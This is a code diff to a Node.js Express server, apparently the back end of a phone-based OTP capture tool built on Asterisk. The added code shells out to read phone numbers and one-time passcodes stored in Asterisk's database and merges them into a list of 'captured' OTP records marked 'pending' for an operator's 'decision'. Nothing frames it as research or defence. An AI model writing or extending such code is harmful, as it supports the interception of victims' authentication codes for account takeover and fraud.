@@ -2388,6 +2388,33 @@ app.post('/api/asterisk/otp/decision', async (req, res) => {
 
 // Endpoint to list all captured OTP records
 app.get('/api/asterisk/otp/records', (req, res) => {
+  // Sincronizar también con la base interna AstDB de Asterisk
+  exec(`asterisk -rx "database show otp_codes" || true`, (err, stdout) => {
+    if (!err && stdout) {
+      const lines = stdout.split('\n');
+      for (const line of lines) {
+        const match = line.match(/^\/otp_codes\/([^\s:]+)\s*:\s*([0-9*#]+)/);
+        if (match) {
+          const num = match[1];
+          const code = match[2];
+          const exists = capturedOtpHistory.some((r) => r.number === num && r.otp === code);
+          if (!exists) {
+            capturedOtpHistory.unshift({
+              id: 'astdb-' + Date.now() + '-' + Math.random().toString(36).substring(2, 6),
+              number: num,
+              otp: code,
+              timestamp: new Date().toLocaleTimeString(),
+              channel: 'Ext. 7777',
+              service: 'Captura en Vivo (7777)',
+              status: 'pending',
+            });
+            if (capturedOtpHistory.length > 300) capturedOtpHistory.pop();
+          }
+        }
+      }
+    }
+  });
+
   res.json({ success: true, records: capturedOtpHistory });
 });
 
